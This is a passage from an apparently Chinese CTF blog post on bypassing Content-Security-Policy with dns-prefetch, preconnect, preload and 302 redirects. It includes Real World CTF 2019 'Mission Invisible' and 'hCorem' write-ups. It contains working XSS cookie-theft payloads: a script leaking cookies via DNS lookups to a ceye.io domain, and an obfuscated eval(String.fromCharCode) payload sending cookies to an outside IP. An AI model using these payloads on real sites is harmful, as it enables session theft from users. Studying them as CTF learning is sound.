<h4 id="dns-prefetch"><a href="#dns-prefetch" class="headerlink" title="dns-prefetch"></a>dns-prefetch</h4><h5 id="dns-prefetch-DNS预解析-允许浏览器在后台提前将资源的域名转换为-IP-地址，当用户访问该资源时就可以加快-DNS-解析。"><a href="#dns-prefetch-DNS预解析-允许浏览器在后台提前将资源的域名转换为-IP-地址，当用户访问该资源时就可以加快-DNS-解析。" class="headerlink" title="dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。"></a>dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxx.com&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="同样想要在"><a href="#同样想要在" class="headerlink" title="同样想要在"></a>同样想要在</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure>

<h5 id="这种情况下收获-Cookie-的话"><a href="#这种情况下收获-Cookie-的话" class="headerlink" title="这种情况下收获 Cookie 的话"></a>这种情况下收获 Cookie 的话</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    dcl = <span class="built_in">document</span>.cookie.split(<span class="string">";"</span>);</span></span><br><span class="line"><span class="javascript">    n0 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;dcl.length;i++)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(dcl[i]);</span></span><br><span class="line"><span class="javascript">        n0.innerHTML = n0.innerHTML + <span class="string">"&lt;link rel=\"dns-prefetch\" href=\"//"</span> + <span class="built_in">escape</span>(dcl[i].replace(<span class="regexp">/\//g</span>, <span class="string">"-"</span>)).replace(<span class="regexp">/%/g</span>, <span class="string">"_"</span>) + <span class="string">'.'</span> + location.hostname.replace(<span class="regexp">/\./g</span>, <span class="string">"-"</span>) +  <span class="string">".wb7g7z.ceye.io\"&gt;"</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="因为域名的命名规则是-a-zA-Z0-9-，所以需要对一些特殊字符进行替换"><a href="#因为域名的命名规则是-a-zA-Z0-9-，所以需要对一些特殊字符进行替换" class="headerlink" title="因为域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换"></a>因为域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换</h5><h5 id="然后到-ns-服务器上获取-DNS-查询记录就可以了，我用的是这个平台"><a href="#然后到-ns-服务器上获取-DNS-查询记录就可以了，我用的是这个平台" class="headerlink" title="然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个平台"></a>然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个<a href="http://ceye.io/" target="_blank" rel="noopener">平台</a></h5><h4 id="preconnect"><a href="#preconnect" class="headerlink" title="preconnect"></a>preconnect</h4><h5 id="preconnect-预连接-，与-DNS预解析-类似，但它不仅完成-DNS-预解析，还进行-TCP-握手和-TLS-协商"><a href="#preconnect-预连接-，与-DNS预解析-类似，但它不仅完成-DNS-预解析，还进行-TCP-握手和-TLS-协商" class="headerlink" title="preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商"></a>preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商</h5><h5 id="利用方式和上面类似"><a href="#利用方式和上面类似" class="headerlink" title="利用方式和上面类似"></a>利用方式和上面类似</h5><h4 id="preload"><a href="#preload" class="headerlink" title="preload"></a>preload</h4><h5 id="preload-是一个新的-web-标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而-prefetch-以低优先权取回下一个页面的资源"><a href="#preload-是一个新的-web-标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而-prefetch-以低优先权取回下一个页面的资源" class="headerlink" title="preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源"></a>preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源</h5><h5 id="和其他属性值不同的是，它是由-connect-src-决定的，只有-CSP-长下面这样时才会对-href-里的资源发起请求"><a href="#和其他属性值不同的是，它是由-connect-src-决定的，只有-CSP-长下面这样时才会对-href-里的资源发起请求" class="headerlink" title="和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求"></a>和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; connect-src *;</span><br></pre></td></tr></table></figure>

<h5 id="然后就是和上面类似的-payload-了"><a href="#然后就是和上面类似的-payload-了" class="headerlink" title="然后就是和上面类似的 payload 了"></a>然后就是和上面类似的 payload 了</h5><h4 id="prerender"><a href="#prerender" class="headerlink" title="prerender"></a>prerender</h4><h5 id="测试了下好像已经不行了，没有-CSP-头也不行"><a href="#测试了下好像已经不行了，没有-CSP-头也不行" class="headerlink" title="测试了下好像已经不行了，没有 CSP 头也不行"></a>测试了下好像已经不行了，没有 CSP 头也不行</h5><h5 id="302-Redirect-Bypass"><a href="#302-Redirect-Bypass" class="headerlink" title="302 Redirect Bypass"></a>302 Redirect Bypass</h5><h5 id="很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接"><a href="#很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接" class="headerlink" title="很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接"></a>很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接</h5><h5 id="在-PHP-中一般这样来实现"><a href="#在-PHP-中一般这样来实现" class="headerlink" title="在 PHP 中一般这样来实现"></a>在 PHP 中一般这样来实现</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Location: http://xxx.com&apos;);</span><br></pre></td></tr></table></figure>

<h5 id="我们看下官方的说明"><a href="#我们看下官方的说明" class="headerlink" title="我们看下官方的说明"></a>我们看下官方的<a href="https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects" target="_blank" rel="noopener">说明</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4.2.2.3. Paths and Redirects</span><br><span class="line"></span><br><span class="line">To avoid leaking path information cross-origin (as discussed in Egor Homakov’s Using Content-Security-Policy for Evil), the matching algorithm ignores the path component of a source expression if the resource being loaded is the result of a redirect. For example, given a page with an active policy of img-src example.com not-example.com/path:</span><br><span class="line"></span><br><span class="line">Directly loading https://not-example.com/not-path would fail, as it doesn’t match the policy.</span><br><span class="line">Directly loading https://example.com/redirector would pass, as it matches example.com.</span><br><span class="line">Assuming that https://example.com/redirector delivered a redirect response pointing to https://not-example.com/not-path, the load would succeed, as the initial URL matches example.com, and the redirect target matches not-example.com/path if we ignore its path component.</span><br></pre></td></tr></table></figure>

<h5 id="也就是说只要产生跳转的页面在-CSP-下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的"><a href="#也就是说只要产生跳转的页面在-CSP-下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的" class="headerlink" title="也就是说只要产生跳转的页面在 CSP 下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的"></a>也就是说只要产生跳转的页面在 CSP 下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的</h5><h4 id="上面总结了CSP的用法和他的一般绕过下面是一些实例："><a href="#上面总结了CSP的用法和他的一般绕过下面是一些实例：" class="headerlink" title="上面总结了CSP的用法和他的一般绕过下面是一些实例："></a>上面总结了CSP的用法和他的一般绕过下面是一些实例：</h4><h4 id="realWorld-CTF2019的Mission-Invisible"><a href="#realWorld-CTF2019的Mission-Invisible" class="headerlink" title="realWorld CTF2019的Mission Invisible"></a>realWorld CTF2019的Mission Invisible</h4><h5 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> getUrlParam = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^|&amp;)"</span> + name + <span class="string">"=([^&amp;]*)(&amp;|$)"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> r = <span class="built_in">unescape</span>(<span class="built_in">window</span>.location.search.substr(<span class="number">1</span>)).match(reg);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> r[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> Days = <span class="number">30</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line">        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + value + <span class="string">";expires="</span> + exp.toGMTString();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> search = name + <span class="string">"="</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> offset = <span class="built_in">document</span>.cookie.indexOf(search);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span></span><br><span class="line">            offset += search.length;</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> end = <span class="built_in">document</span>.cookie.indexOf(<span class="string">";"</span>, offset);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (end == <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                end = <span class="built_in">document</span>.cookie.length;</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="built_in">unescape</span>(<span class="built_in">document</span>.cookie.substring(offset, end));</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setElement</span>(<span class="params">tag</span>) </span>&#123;</span></span><br><span class="line">        tag = tag.substring(0, 1);</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ele = <span class="built_in">document</span>.createElement(tag);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> attrs = getCookie(<span class="string">"attrs"</span>).split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; attrs.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> key = attrs[i].split(<span class="string">"="</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> value = attrs[i].split(<span class="string">"="</span>)[<span class="number">1</span>];</span></span><br><span class="line">            ele.setAttribute(key, value);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(ele);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> tag = getUrlParam(<span class="string">"tag"</span>);</span></span><br><span class="line"><span class="javascript">    setCookie(<span class="string">"tag"</span>, tag);</span></span><br><span class="line">    setElement(tag);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="题目源码的分析如下："><a href="#题目源码的分析如下：" class="headerlink" title="题目源码的分析如下："></a>题目源码的分析如下：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;p onfocus="alert(document.cookie)" id="1" tabindex="0"&gt;&lt;/p&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    /**</span><br><span class="line">     * 正则表达式匹配/(^|&amp;)tag=([^&amp;]*)(&amp;|$)/</span><br><span class="line"><span class="javascript">     * <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>)截取?号后面的参数</span></span><br><span class="line"><span class="javascript">     * <span class="built_in">unescape</span>()用来将形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），</span></span><br><span class="line">     * 用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。</span><br><span class="line">     * r[2]可以是这样一串字符：</span><br><span class="line">     * a=1attrs=onmouserover=1%26onfocus=alert(1)%26id=1%26tabindex=0</span><br><span class="line">     * @param name</span><br><span class="line"><span class="javascript">     * @returns &#123;string|<span class="literal">null</span>&#125;</span></span><br><span class="line">     */</span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> getUrlParam = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^|&amp;)"</span> + name + <span class="string">"=([^&amp;]*)(&amp;|$)"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> r = <span class="built_in">unescape</span>(<span class="built_in">window</span>.location.search.substr(<span class="number">1</span>)).match(reg);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(r);</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> r[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 这个函数用来设置cookie</span><br><span class="line">     * 可以是这样的：</span><br><span class="line">     * a=1attrs=onmouserover=1%26onfocus=alert(1)%26id=1%26tabindex=0</span><br><span class="line">     * @param name</span><br><span class="line">     * @param value</span><br><span class="line">     */</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> Days = <span class="number">30</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line">        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + value + <span class="string">";expires="</span> + exp.toGMTString();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * search是attrs=是固定的</span><br><span class="line"><span class="javascript">     * <span class="built_in">document</span>.cookie是tag=a=<span class="number">1</span>attrs=onmouserover=<span class="number">1</span>%<span class="number">26</span>onfocus=alert(<span class="number">1</span>)%<span class="number">26</span>id=<span class="number">1</span>%<span class="number">26</span>tabindex=<span class="number">0</span></span></span><br><span class="line">     * 那么offset就是7</span><br><span class="line">     */</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> search = name + <span class="string">"="</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> offset = <span class="built_in">document</span>.cookie.indexOf(search);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (offset !== <span class="number">-1</span>) &#123;</span></span><br><span class="line">            offset += search.length;</span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> end = <span class="built_in">document</span>.cookie.indexOf(<span class="string">";"</span>, offset);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (end === <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                end = <span class="built_in">document</span>.cookie.length;</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="built_in">unescape</span>(<span class="built_in">document</span>.cookie.substring(offset, end));</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * tag.substring(0,1)的值是a</span><br><span class="line"><span class="javascript">     * <span class="built_in">document</span>.createElement(tag)用来创建一个元素a</span></span><br><span class="line">     * getCookie得到：onmouserover=1&amp;onfocus=alert(1)&amp;id=1&amp;tabindex=0</span><br><span class="line">     * 最终会得到元素：</span><br><span class="line"><span class="javascript">     * <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouserover</span>=<span class="string">"1"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">tabindex</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line">     * 利用url加描点#1可以触发</span><br><span class="line">     * 最后将cookie打到本地：</span><br><span class="line"><span class="javascript">     * http:<span class="comment">//52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</span></span></span><br><span class="line">     * @param tag</span><br><span class="line">     */</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setElement</span>(<span class="params">tag</span>) </span>&#123;</span></span><br><span class="line">        tag = tag.substring(0, 1);</span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> ele = <span class="built_in">document</span>.createElement(tag);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> attrs = getCookie(<span class="string">"attrs"</span>).split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; attrs.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> key = attrs[i].split(<span class="string">"="</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> value = attrs[i].split(<span class="string">"="</span>)[<span class="number">1</span>];</span></span><br><span class="line">            ele.setAttribute(key, value);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(ele);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> tag = getUrlParam(<span class="string">"tag"</span>);</span></span><br><span class="line"><span class="javascript">    setCookie(<span class="string">"tag"</span>, tag);</span></span><br><span class="line">    setElement(tag);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="最后的payload："><a href="#最后的payload：" class="headerlink" title="最后的payload："></a>最后的payload：</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr=<span class="string">"window.location='http://127.0.0.1:80/'+document.cookie"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">charToAscii</span>(<span class="params">string,mode</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> result=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">let</span> str=string;</span><br><span class="line">        <span class="keyword">const</span> len=string.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i===len<span class="number">-1</span>)</span><br><span class="line">                result+=str.charCodeAt(i);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result+=str.charCodeAt(i)+mode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(charToAscii(arr,<span class="string">","</span>));</span><br><span class="line">    <span class="keyword">const</span> payload=<span class="built_in">String</span>.fromCharCode(<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">46</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">61</span>,<span class="number">39</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">58</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">43</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">101</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">eval</span>(payload));</span><br></pre></td></tr></table></figure>

<h4 id="realWorld-CTF2019的hCorem："><a href="#realWorld-CTF2019的hCorem：" class="headerlink" title="realWorld CTF2019的hCorem："></a>realWorld CTF2019的hCorem：</h4><h4 id="题目介绍："><a href="#题目介绍：" class="headerlink" title="题目介绍："></a>题目介绍：</h4><h5 id="hCorem是利用易受攻击的脚本来注入XSS并检索最新浏览器的Cookie（Chrome-v77-0-3865-75）"><a href="#hCorem是利用易受攻击的脚本来注入XSS并检索最新浏览器的Cookie（Chrome-v77-0-3865-75）" class="headerlink" title="hCorem是利用易受攻击的脚本来注入XSS并检索最新浏览器的Cookie（Chrome v77.0.3865.75）"></a>hCorem是利用易受攻击的脚本来注入XSS并检索最新浏览器的Cookie（Chrome v77.0.3865.75）</h5><h5 id="提供了包含构建任务的Docker容器所需的文件的归档文件。它包含以下文件："><a href="#提供了包含构建任务的Docker容器所需的文件的归档文件。它包含以下文件：" class="headerlink" title="提供了包含构建任务的Docker容器所需的文件的归档文件。它包含以下文件："></a>提供了包含构建任务的Docker容器所需的文件的归档文件。它包含以下文件：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker-compose.yaml</span><br><span class="line">├── dockerfile-php</span><br><span class="line">├── hcorem.conf</span><br><span class="line">├── html</span><br><span class="line">│   ├── api.php</span><br><span class="line">│   ├── hcorem.js</span><br><span class="line">│   └── index.html</span><br><span class="line">└── nginx.conf</span><br></pre></td></tr></table></figure>

